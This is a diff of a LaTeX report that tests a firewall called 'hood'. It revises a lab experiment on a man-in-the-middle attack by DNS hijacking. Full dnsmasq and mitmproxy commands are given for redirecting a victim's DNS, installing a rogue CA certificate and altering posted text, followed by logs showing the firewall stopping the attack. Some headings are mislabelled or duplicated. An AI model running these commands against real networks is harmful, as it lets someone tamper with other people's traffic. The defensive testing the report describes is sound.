@@ -720,14 +720,18 @@ As conclusion, most of decisions on disabling things are based on the analyzatio
 \paragraph{}
 To be close to real-world application of this tool, a computer from the university classroom and my iPhone are used to test the firewall. The computer has remote management tools pre-installed and I do not have the administrator permissions to configure the computer or to install some protection tools. Thus, without the help from the firewall, there is very little I can do. Experiment data can be found from project GitHub repository \citep{hood:github}.
 
-\section{Man-in-the-middle (MITM) attack}
+\section{Man-in-the-middle (MITM) attack and DNS hijacking}
 \subsection{Experiment tools}
 \paragraph{}
 Following devices are used in the experiment: Two computers running live Parrot OS from Parrot-htb-6.0_amd64.iso. A Raspberry Pi 4B running hood firewall installed with the parameter "harden\_only=1" to 2023-12-05-raspios-bookworm-arm64.img.xz.
 
 \subsection{Experiment steps}
 \paragraph{}
-At first, enable network sharing on Computer 1, and connec
+Computer 1 plays the role of internet provider and the role of certificate authority. Computer 2 plays the role of victim.
+
+\subsubsection{Create shared network}
+\paragraph{}
+At first, enable network sharing on Computer 1, and connect two computers via Ethernet ports.
 \begin{lstlisting}[language={},breaklines=true,postbreak=\mbox{\textcolor{red}{$\hookrightarrow$}\space}]
 - Computer 1, Terminal 1
 > nmcli device set eno1 managed no
@@ -746,9 +750,10 @@ At first, enable network sharing on Computer 1, and connec
 > sudo /usr/sbin/dnsmasq --conf-file=/dev/null --no-hosts --no-resolv --keep-in-foreground --interface=eno1 --except-interface=lo --clear-on-reload --strict-order --listen-address=192.168.22.1 --bind-interfaces --no-poll --server=1.1.1.1  --cache-size=0  --dhcp-range=192.168.22.1,192.168.22.255,255.255.255.0,400w --dhcp-authoritative --dhcp-leasefile=/tmp/yongbin.lease --dhcp-option=option:dns-server,192.168.22.1 --dhcp-option=3,192.168.22.1 --log-queries --log-facility=-
 \end{lstlisting}
 
-\subsection{Without attack and protection}
+\subsubsection{Without attack and protection}
 \paragraph{}
-At first following commands and results are recorded.
+The following records show what happens without MITM attack: the text posted successfully and looks the same to both computers.
+
 \begin{lstlisting}[language={},breaklines=true,postbreak=\mbox{\textcolor{red}{$\hookrightarrow$}\space}]
 # post text without MITM attack
 - Computer 2, Terminal 1
@@ -762,22 +767,66 @@ Thank you very much for the feedback. Your suggestion on X sounds legit. I will 
 # everything is correct
 \end{lstlisting}
 
-\subsection{With attack but without protection}
+\subsubsection{With MITM attack by DNS hijacking without protection}
 \paragraph{}
-At first following commands and results are recorded as the control group.
+Following commands are used to prepare MITM attack by DNS hijacking.
 \begin{lstlisting}[language={},breaklines=true,postbreak=\mbox{\textcolor{red}{$\hookrightarrow$}\space}]
-# post text without MITM attack
-- Computer 2, Terminal 1
-> echo "Thank you very much for the feedback. Your suggestion on X sounds legit. I will make X able to Y after I finished Z. I will send you another email once I finished related tasks." | curl -sS -F 'sprunge=<-' https://sprunge.us
-http://sprunge.us/yqnNHp
-> curl https://sprunge.us/yqnNHp
-Thank you very much for the feedback. Your suggestion on X sounds legit. I will make X able to Y after I finished Z. I will send you another email once I finished related tasks.
 - Computer 1, Terminal 2
-> curl https://sprunge.us/yqnNHp
-Thank you very much for the feedback. Your suggestion on X sounds legit. I will make X able to Y after I finished Z. I will send you another email once I finished related tasks.
-# everything is correct
+> sudo kill $(ps -ef |grep dnsmasq|grep yongbin -m 1|sed "s/\w* *//"|cut -d " " -s -f 1)
+> sudo /usr/sbin/dnsmasq --conf-file=/dev/null --no-hosts --no-resolv --keep-in-foreground --interface=eno1 --except-interface=lo --clear-on-reload --strict-order --listen-address=192.168.22.1 --bind-interfaces --no-poll --address=/#/192.168.22.1  --cache-size=0  --dhcp-range=192.168.22.1,192.168.22.255,255.255.255.0,400w --dhcp-authoritative --dhcp-leasefile=/tmp/yongbin.lease --dhcp-option=option:dns-server,192.168.22.1 --dhcp-option=3,192.168.22.1 --log-queries --log-facility=-
+
+- Computer 1, Terminal 1
+> mitmproxy --listen-port 443 --listen-host 192.168.22.1 -s mitmattack.py
+
+- Computer 1, Terminal 3
+> python3 -m http.server -d ~/.mitmproxy/
+
+- Computer 2, Terminal 1
+> wget 192.168.22.1/mitmproxy-ca-cert.pem
+
+- Computer 1, Terminal 3
+> ^C
 \end{lstlisting}
 
+\subsubsection{Without attack and protection}
+\paragraph{}
+Following records show what happened under attack: The posted text looks correct to the victim but looks different to other person.
+
+\begin{lstlisting}[language={},breaklines=true,postbreak=\mbox{\textcolor{red}{$\hookrightarrow$}\space}]
+# post text when CA is doing MITM attack, without hood
+- Computer 2, Terminal 1
+> echo "Thank you very much for the feedback. Your suggestion on X sounds legit. I will make X able to Y after I finished Z. I will send you another email once I finished related tasks." | curl -sS --cacert mitmproxy-ca-cert.pem -F 'sprunge=<-' https://sprunge.us
+http://sprunge.us/ARbKPO
+> curl -sS --cacert mitmproxy-ca-cert.pem https://sprunge.us/ARbKPO
+Thank you very much for the feedback. Your suggestion on X sounds legit. I will make X able to Y after I finished Z. I will send you another email once I finished related tasks.
+# The result looks correct to the victim
+- Computer 1, Terminal 3
+> curl https://sprunge.us/ARbKPO
+Who do you think you are? How dare you to give me suggestions like this? Your naive ideas will never work. You have been blocked. *NEVER* send me emails again.
+# However, the result looks different to other person
+\end{lstlisting}
+
+\subsubsection{With MITM attack by DNS hijacking with "hood" protection}
+\paragraph{}
+Next, test what happens to the victim with "hood" firewall. Steps are following. 1. Connect Raspberry Pi to computer by USB cable 2. Disconnect the Ethernet cable from computer 2 and connect it to Raspberry Pi. 3. Use following commands to give direct access to other websites but still attacking the wbsite sprunge.us.
+
+\begin{lstlisting}[language={},breaklines=true,postbreak=\mbox{\textcolor{red}{$\hookrightarrow$}\space}]
+- Computer 1, Terminal 3
+> sudo kill $(ps -ef |grep dnsmasq|grep yongbin -m 1|sed "s/\w* *//"|cut -d " " -s -f 1)
+> sudo /usr/sbin/dnsmasq --conf-file=/dev/null --no-hosts --no-resolv --keep-in-foreground --interface=eno1 --except-interface=lo --clear-on-reload --strict-order --listen-address=192.168.22.1 --bind-interfaces --no-poll --address=/sprunge.us/192.168.22.1 --server=1.1.1.1 --cache-size=0  --dhcp-range=192.168.22.1,192.168.22.255,255.255.255.0,400w --dhcp-authoritative --dhcp-leasefile=/tmp/yongbin.lease --dhcp-option=option:dns-server,192.168.22.1 --dhcp-option=3,192.168.22.1 --log-queries --log-facility=-
+\end{lstlisting}
+
+\paragraph{}
+Following records show what happened: The victim bypassed the attack.
+\begin{lstlisting}[language={},breaklines=true,postbreak=\mbox{\textcolor{red}{$\hookrightarrow$}\space}]
+# Computer 2 starts to use hood firewall
+- Computer 2, Terminal 1
+> curl https://sprunge.us/ARbKPO
+Who do you think you are? How dare you to give me suggestions like this? Your naive ideas will never work. You have been blocked. *NEVER* send me emails again.
+# DNS redirect attack stopped working
+\end{lstlisting}
+
+\subsubsection{With MITM attack by DNS hijacking with "hood" protection}
 
 \section{metasploit}
 \subsection{Experiment tools}
